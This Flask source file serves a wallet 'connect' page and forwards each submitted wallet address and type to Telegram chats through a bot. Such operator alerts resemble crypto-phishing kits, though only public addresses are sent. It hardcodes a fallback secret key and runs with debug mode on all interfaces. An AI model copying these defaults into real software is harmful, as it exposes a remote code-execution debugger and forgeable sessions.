import os
import sys
from flask import *
import requests
from dotenv import load_dotenv

# Загрузка переменных окружения
load_dotenv()

app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'ThisIsSecretSecretSecretLife')

# Конфигурация Telegram
TELEGRAM_BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')
TELEGRAM_CHAT_IDS = os.getenv('TELEGRAM_CHAT_IDS', '').split(',')

@app.route('/static/<path:filename>')
def static_files(filename):
    static_folder = resource_path('static')
    return send_from_directory(static_folder, filename)
def resource_path(relative_path):
    """ Получает абсолютный путь к ресурсу для работы и в exe """
    try:
        # PyInstaller создает временную папку и хранит путь в _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


# Устанавливаем правильные пути
app.template_folder = resource_path('templates')


def send_telegram_notification(wallet_address, wallet_type):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_IDS:
        app.logger.error("Telegram bot token or chat IDs are missing")
        return

    message = (
        "🛡️ *Нове підключення гаманця!*\n\n"
        f"💼 *Тип гаманця:* `{wallet_type}`\n"
        f"📭 *Адреса:* `{wallet_address}`"
    )

    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"

    for chat_id in TELEGRAM_CHAT_IDS:
        if not chat_id.strip():
            continue
        payload = {
            "chat_id": chat_id.strip(),
            "text": message,
            "parse_mode": "Markdown"
        }
        try:
            response = requests.post(url, json=payload)
            response.raise_for_status()
            app.logger.info(f"Message sent successfully to {chat_id}: {response.json()}")
        except requests.exceptions.RequestException as e:
            app.logger.error(f"Telegram send error for {chat_id}: {e}")


@app.route('/')
def home():
    session['user'] = os.urandom(16).hex()
    # Для отладки - выводим путь к шаблонам
    print(f"Template directory: {app.template_folder}")
    print(f"Files in templates: {os.listdir(app.template_folder)}")
    return render_template('index.html')


@app.route('/connect_wallet', methods=['POST'])
def connect_wallet():
    data = request.json
    wallet_address = data.get('wallet_address')
    wallet_type = data.get('wallet_type')

    if not wallet_address or not wallet_type:
        return jsonify({"status": "error", "message": "Invalid data"}), 400

    try:
        session['wallet_address'] = wallet_address
        session['wallet_type'] = wallet_type

        send_telegram_notification(wallet_address, wallet_type)

        return jsonify({"status": "success", "message": "Wallet connected!"})
    except Exception as e:
        app.logger.error(f"Error: {e}")
        return jsonify({"status": "error", "message": "Internal server error"}), 500


if __name__ == '__main__':
    # Для отладки показываем где ищет статические файлы
    print(f"Static folder: {resource_path('static')}")
    print(f"Files in static: {os.listdir(resource_path('static'))}")
    print(f"Icons in static: {os.listdir(os.path.join(resource_path('static'), 'icons'))}")

    app.run(host='0.0.0.0', port=5000, debug=True)